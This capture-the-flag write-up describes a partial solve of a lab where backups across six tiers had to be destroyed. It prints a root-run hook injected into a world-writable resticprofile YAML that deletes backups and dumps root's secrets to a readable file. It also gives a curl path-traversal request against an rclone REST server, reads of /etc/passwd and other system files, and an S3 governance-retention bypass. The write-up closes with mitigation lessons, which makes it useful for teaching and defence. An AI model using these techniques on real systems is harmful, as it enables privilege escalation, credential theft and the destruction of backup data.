# Flacksafety: five destroyed backup tiers, one unresolved

[По-русски](solve.ru.md)

## 0. Goal, lab and actual result

The challenge described a leaked camera recording, a workstation IP and an employee's `/etc/shadow` entry. The objective was to destroy a recording across **all backup tiers**, with a separate internal dashboard checking the result.

This demanded substantially more than retrieving one file. The completed work covered Linux credentials, a writable privileged scheduler configuration, restic, versioned S3 with governance retention, rclone REST, a private SFTP backend and Kubernetes container boundaries.

**Verified outcome: five of six backup tiers were reported Destroyed, and the governance flag was accepted. The sixth tier, Old Rclone Remote, remained Intact. The second flag was not obtained.** This is a documented partial solve, not a complete six-tier success.

The observed service topology:

```text
[employee workstation] -- SSH, resticprofile, root supercronic
          |
          +--> [backups-server]
          |      S3 VersityGW :7070
          |      rclone REST :8000
          |      offsite REST :8001
          |      internal SFTP on loopback :2200
          |      /data/rclone/workstation/
          |      /data/rclone/workstation-legacy/
          |
          +--> [backups-checker :8080]
                 GET /
                 GET /main.rs (Rust source)
```

Live IP addresses and working credentials are deliberately redacted. The technical path is based on preserved session transcripts, including corrective experiments after early incorrect assumptions.

## 1. Employee foothold: the shadow file

The challenge attachment contained only `shadow.txt`, a roughly 128-byte Unix password hash. It was Argon2id; the team recovered the employee password offline and used it to connect by SSH to `backups-workstation`.

```text
attachment: fullpwn.flacksafety.zip
content: shadow.txt
hash scheme: Argon2id
principal: employee
access: SSH to the challenge workstation
```

The employee credentials granted access to the workstation, **not** to backups-server or a Kubernetes administrator identity. The original password is omitted from this public version.

## 2. Privilege boundary: a writable resticprofile configuration

The workstation had `/etc/resticprofile/profiles.yaml` with mode `rw-rw-rw-`. An unprivileged employee could therefore modify a configuration file consumed by root's scheduled backup process.

A supercronic job ran every minute:

```text
* * * * * resticprofile root.backup
```

The `base.backup` profile supported a `run-before` hook, whose commands executed in the privileged scheduled context. The following hook fragment was preserved in the report:

```yaml
run-before:
  - 'sh -c "rm -rf /backups/* 2>/dev/null; env | sort > /tmp/rootenv; chmod 644 /tmp/rootenv; chmod -R a+rX /backups 2>/dev/null; true"'
```

The command both affected a local backup tier and wrote the root process environment to a readable temporary file. There was no ordinary employee `sudo` route; the escalation was the **trust boundary between world-writable YAML and root's cron-like scheduler**.

## 3. Root environment and infrastructure map

The diagnostic file `/tmp/rootenv` exposed S3 credentials, the REST account credentials and the repository encryption password (`RESTIC_PASSWORD`). Their literal values have been removed from this writeup.

A separate `~/backups.txt` file described the locations of the backup services. Neither of these files was in the original challenge attachment; both were discovered during the live session.

This was the point at which the apparent single-file deletion became a multi-service problem.

## 4. Reading the checker instead of guessing the win condition

The checker published its own Rust source through `GET /main.rs`. The source, recorded as 6,692 bytes, identified **six different checks**:

| Tier | Validation | Path/service |
|---|---|---|
| User Local Backup | restic SFTP | `/home/employee/backups` on workstation |
| Root Local Backup | restic SFTP | `/backups` on workstation |
| Offsite Replica | restic | `/data/offsite/footage` |
| S3 Governance | version-aware S3 check | `footage` bucket on :7070 |
| Rclone Remote 1 | restic | `/data/rclone/workstation/footage` |
| Old Rclone Remote | recursive file-existence test | `/data/rclone/workstation-legacy` |

The normal restic checks searched for `security_footage.mp4`, while the S3 check also considered **noncurrent versions**. The sixth check used a recursively defined predicate:

```rust
fn has_files(dir: &Path) -> io::Result<bool> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        if !entry.file_type()?.is_dir() || has_files(&entry.path())? {
            return Ok(true);
        }
    }
    // false for an empty subtree
}
```

A nonempty subtree meant Intact; an empty or missing subtree meant Destroyed. Errors other than NotFound produced Unknown. Making the path merely unreadable would **not** satisfy the sixth condition.

## 5. Clearing tiers one through five

The live report records these actions:

1. Remove the source recording `~/footage/security_footage.mp4`.
2. Clean/prune the user and root local backups.
3. Clean/prune the offsite repository, subject to its independent retention process.
4. Remove S3 noncurrent object versions using the available `--bypass-governance-retention` permission.
5. Clean the regular `workstation` rclone/restic repository.

The later recovered server entrypoint confirmed that VersityGW used an S3 bucket with Object Lock set to `GOVERNANCE` and a 3,650-day default retention. This explains why deleting the current object alone would not necessarily pass the governance check: old versions still existed.

The dashboard then showed:

```text
User Local Backup       Destroyed
Root Local Backup       Destroyed
Offsite Replica         Destroyed
S3 Governance           Destroyed
Rclone Remote 1         Destroyed
Old Rclone Remote       Intact
```

The governance flag was issued and accepted. The full command-by-command deletion history for tiers 1–5 was not included in the transferred ZIP, but the dashboard verification and service logic are recorded.

## 6. Backups-server's actual architecture

From the workstation, three ports were available on backups-server:

- `7070`: VersityGW S3-compatible service;
- `8000`: rclone `serve restic` with `--private-repos`;
- `8001`: a separate append-only restic service.

The investigation eventually recovered `/entrypoint.sh` using a read-through-traversal primitive. Its relevant, redacted lines:

```sh
install -d -o rclonebk /data/rclone
htpasswd -cbB /etc/htpasswd workstation <redacted>
htpasswd -bB /etc/htpasswd workstation-legacy "$LEGACY_REST_PASSWORD"

/usr/sbin/sshd -f /dev/null \
  -o ListenAddress=127.0.0.1:2200 \
  -o AllowUsers=rclonebk \
  -o 'Subsystem sftp internal-sftp'

rclone serve restic ":sftp,host=127.0.0.1,port=2200,user=rclonebk,pass=<redacted>:/data/rclone" \
  --addr :8000 --htpasswd /etc/htpasswd --private-repos --cache-objects=false

rclone serve restic /data/offsite \
  --addr :8001 --htpasswd /etc/htpasswd --append-only --cache-objects=false
```

An important correction: the underlying backend for the private REST endpoint was **SFTP into `/data/rclone`**, not the local backend originally hypothesized. Internal SFTP listened on loopback only; `backups-server:2200` was closed to the workstation.

The private accounts `workstation` and `workstation-legacy` had separate REST authorization boundaries. Having the first account's credentials did not authorize normal access to the second.

## 7. Investigating the path traversal

The exposed rclone version was `1.74.3`. The investigation examined a traversal issue recorded as `CVE-2026-59733`. Early tests from the wrong host failed because `backups-server` did not resolve outside the challenge workstation's cluster namespace. After moving the probes to the SSH workstation, the proper headers and raw URL preservation were used:

```sh
curl --path-as-is \
  -u '<workstation-user>:<password>' \
  -H 'Restic-Version: 2' \
  -H 'Accept: vnd.x.restic.rest.v2' \
  'http://backups-server:8000/workstation/../workstation-legacy/footage/'
```

`--path-as-is` matters because an HTTP client may otherwise normalize the `..` path before sending it.

An initial `GET` directory request returned `200 []`. One early report incorrectly concluded that legacy was empty. A later control request to a deliberately nonexistent repository returned the same response, disproving that inference.

The decisive tests used **known, harmless marker files** and compared operations on a normal path with paths containing `../`:

| Operation | Observed result |
|---|---|
| POST marker inside `/workstation/__ctf_probe_.../` | 200 |
| GET same marker | 200, expected content |
| POST marker under `/workstation/../__ctf_probe_sibling_.../` | 200 |
| GET sibling marker through the same traversal | 200 |
| GET sibling marker through a normal workstation path | 404 |
| DELETE sibling marker through traversal | 200, subsequent GET 404 |
| DELETE a directory | 404 |

Therefore the path traversal **did permit file reads, writes and deletes outside the authenticated user's tree** when the exact filename was known. All test objects were removed afterward.

A subsequent targeted read proved the existence of the legacy repository:

```text
GET /workstation/../workstation-legacy/footage/config
Restic-Version: 2
Accept: vnd.x.restic.rest.v2

HTTP/1.1 200
Content-Length: 155
```

This is stronger evidence than the empty directory-list response: the actual restic config file was retrieved.

## 8. Why the successful traversal did not empty legacy

The sixth checker stage does not ask whether a file named `config` exists. It recursively searches `/data/rclone/workstation-legacy` and considers **any file** evidence that the tier survives.

The path traversal gave **access to a named file** but not a complete directory listing. Restic objects live under `keys/`, `data/`, `index/` and `snapshots/`, often with long hash-based names. Without those names, an otherwise usable DELETE primitive cannot empty the tree.

Directory requests via `workstation/../workstation-legacy/` returned `200 []` even for a nonempty directory, sometimes `500` without a trailing slash. Source-level inspection of rclone's SFTP backend explained why:

```go
root := path.Join(f.absRoot, dir)
remote := path.Join(dir, info.Name())
```

The backend normalizes the file path, producing entries such as `workstation-legacy/footage/config`. The outer REST listing filter compares them with an **unnormalized** path, such as `workstation/../workstation-legacy/footage`, and drops the entries. The directory is not empty; the listing filter simply hides its contents in this path form.

The direct canonical URL `/workstation-legacy/footage/` was denied by `checkPrivate` (403) because the active HTTP identity was `workstation`. File traversal and directory enumeration had different effective security and path-handling behavior.

## 9. Explored and rejected alternatives

### Fullwidth dots

Unicode fullwidth dots (`U+FF0E U+FF0E`, URL `%EF%BC%8E%EF%BC%8E`) were tested as a possible encoding bypass. The config read returned 404, and lists returned `[]`. This did not yield a directory listing.

### .rclonelink alias

A harmless marker was created with a `.rclonelink` suffix and attempted to browse through the alias. The alias was treated as a normal file: target GET returned 404 and listing returned `[]`. The server was not running with `--links`. Probe files were deleted.

### Different methods and directory removal

`PUT` returned 405; directory `DELETE` returned 404. `OPTIONS` returned 403 and `HEAD` often 500. POST/GET/DELETE **regular files** did work, but no recursive directory removal primitive was confirmed.

### Other backup endpoints

The offsite endpoint on :8001 had no legacy copy. VersityGW exposed only the `footage` bucket, not the private legacy directory.

### The separate legacy account password

The server entrypoint used an environment variable `LEGACY_REST_PASSWORD` to populate the bcrypt `/etc/htpasswd` entry for `workstation-legacy`. This was **not** the same as `RESTIC_PASSWORD` used to encrypt backup data.

The team tested theme-based candidates and a full `rockyou.txt` pass (about 14.3 million entries) without success. A `restic` attempt through traversal also failed to find repository keys because listing `keys/` returned `[]`. Guessing a password was not a solution to the listing bug, so this direction was stopped.

### Kubernetes, process and filesystem access

The workstation had no usable Kubernetes service-account token, kubeconfig, container tooling or relevant mounted volumes. On backups-server, service-account token paths were 404 and root's kubeconfig was inaccessible to the rclone process.

The recovered `/etc/passwd` showed rclone running as `rclonebk`, uid 1000. `/proc/*/cmdline` and `/proc/mounts` read as empty files through the traversal and `/proc/*/environ` was inaccessible. This did not expose the environment password. An attempted write of an **unchanged** copy of `/etc/htpasswd` returned 500; a checksum check showed that the file had not changed.

## 10. An expanded root-filesystem read

The final investigation found that additional `../` components could reach paths outside the rclone storage root, within the filesystem permissions of uid 1000:

```text
/workstation/../../../etc/hostname          -> 200
/workstation/../../../etc/passwd            -> 200
/workstation/../../../etc/hosts             -> 200
/workstation/../../../etc/resolv.conf       -> 200
/workstation/../../../data/rclone/workstation-legacy/footage/config -> 200
```

This exposed the server entrypoint and explained the SFTP backend, account creation and permissions. It did **not** grant a shell, root permissions or a raw directory-enumeration API.

The investigation therefore ended with an accurate characterization of a significant arbitrary file-read/write/delete primitive and a separately unresolved directory-emptiness objective.

## 11. End state

The last trustworthy dashboard state was:

```text
5 destroyed / 1 intact
Old Rclone Remote: Intact
FLAG_2: not issued
```

Subsequent SSH, REST, checker and gateway probes stopped receiving replies even though the VPN interface remained up. That is recorded as loss of access to the CTF environment, **not** a successful security fix or proof of impossibility.

Precisely what was and was not accomplished:

- Governance flag: **accepted**.
- Tiers 1–5: **confirmed Destroyed** by the checker.
- Path traversal for known files: **confirmed** for GET/POST/DELETE.
- Root-filesystem file reads within uid 1000 permissions: **confirmed**.
- Full legacy directory enumeration: **not achieved**.
- `LEGACY_REST_PASSWORD`: **not recovered**.
- Tier 6 and second flag: **not completed**.

## 12. Lessons and mitigation

1. A world-writable configuration consumed by a root scheduler is effectively a root-command injection surface.
2. Root process environments can contain credentials for **every** backup backend; service credentials and privilege boundaries should be separated.
3. With S3 versioning and Object Lock, noncurrent object versions and governance bypass rights must be audited, not just regular delete permissions.
4. A private repository prefix is only effective when authentication, file operations and directory enumeration all use the **same canonical path**. Normalize before authorizing.
5. `HTTP 200 []` does not prove an empty filesystem directory. Always compare a known existing and known absent control.
6. `restic find` and a recursive `has_files` are fundamentally different win conditions; a working method for one tier may have no effect on the other.

## 13. Sources and reproduction limits

- Shipped archive: `fullpwn.flacksafety.zip` containing only `shadow.txt`.
- The checker Rust source and server `/entrypoint.sh` were retrieved live and described in preserved investigation notes; their full byte-for-byte files were not supplied in the later ZIP.
- Primary evidence: the [sanitized reconstruction](evidence/reconstruction.md) and surviving controlled-test notes. Contradictions in early hypotheses were resolved using later independent probes.
- This is a reconstruction from authenticated challenge logs, not a claim that a new live run was performed.

## Repository evidence

Source code and redacted supporting artifacts: [`evidence/reconstruction.md`](evidence/reconstruction.md).
